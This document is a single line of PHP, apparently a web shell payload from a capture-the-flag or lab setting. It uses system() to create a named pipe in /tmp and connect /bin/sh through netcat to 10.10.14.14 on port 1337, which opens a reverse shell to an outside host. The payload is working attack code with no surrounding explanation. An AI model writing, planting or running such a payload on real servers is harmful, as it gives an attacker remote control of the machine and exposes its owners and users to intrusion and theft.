<?php system("mknod /tmp/backpipe p ; /bin/sh 0</tmp/backpipe | nc 10.10.14.14 1337 1>/tmp/backpipe");?>
